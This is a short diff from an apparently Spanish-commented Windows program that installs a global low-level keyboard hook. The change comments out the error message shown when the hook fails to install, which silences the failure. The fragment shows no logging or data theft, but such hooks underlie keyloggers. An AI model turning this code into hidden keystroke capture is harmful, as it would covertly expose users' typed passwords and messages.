@@ -26,7 +26,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
     // Instalar hook
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
     if (!hHook) {
-        MessageBox(NULL, L"No se pudo instalar el hook", L"Error", MB_ICONERROR);
+        //MessageBox(NULL, L"No se pudo instalar el hook", L"Error", MB_ICONERROR);
         return -1;
     }
 
